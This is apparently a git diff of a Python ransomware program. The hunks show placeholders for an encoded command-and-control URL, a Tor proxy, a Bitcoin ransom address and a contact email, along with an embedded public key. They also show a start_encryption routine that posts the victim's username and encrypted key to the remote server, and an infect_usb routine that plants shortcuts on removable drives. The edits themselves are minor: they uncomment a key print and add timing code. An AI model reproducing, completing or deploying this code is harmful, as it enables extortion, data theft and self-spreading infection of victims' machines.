@@ -40,10 +40,10 @@ from Crypto.Random import get_random_bytes
 from zeroize import zeroize1, mlock, munlock
 
 # Decode the encoded URL using the dx42 function.
-YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
+YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode() # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
-YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()  # Replace with your encoded proxy
+YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
 YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
 id = ""
@@ -61,7 +61,7 @@ j2i4iYNNBE/Upy5a068ENukV8FeswaZ+1bVbtivFEFKUwq2ACFRpWYTFXXsc605D
 /mVZn4oZjcs024o4QF6eKNyeW9eOyXcL+Q7T5WEexIfAfFVsiaG5vvjRS9aoigN0
 gCnFTWHHUYN7SsuCUlWqlyHfO3W7s8NTSPm8F7uoAzRkRgpGF3WjSblJWsz9fuAw
 9uTrsCjzkyencwnXJwLxQVMCAwEAAQ==
------END PUBLIC KEY-----"""  # Replace with your public key if needed
+-----END PUBLIC KEY-----""" # Replace with your public key if needed
 
 
 def is_admin():
@@ -373,7 +373,7 @@ def start_encryption():
     try:
         mlock(key)
         mlock(key_b64)
-        # print(key_b64.decode())
+        print(key_b64.decode())
         encrypted_key = encrypt_key(bytes(key_b64))
         data = {
             "username": getpass.getuser(),
@@ -390,7 +390,6 @@ def start_encryption():
                 requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
                 break
             except requests.exceptions.RequestException as e:
-                # print(f"Error sending data: {e}")
                 continue
         with open(
             os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256"), "wb"
@@ -707,7 +706,6 @@ def infect_usb():
             shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
             shortcut.save()
         except Exception as e:
-            # print(f"Error while infect {usb_root}: {e}")
             pass
 
 
@@ -794,6 +792,9 @@ if __name__ == "__main__":
         change_wallpaper()
         shutdown()
     else:
+        start = time.time()
         start_encryption()
+        end = time.time()
+        print(end - start)
 
 
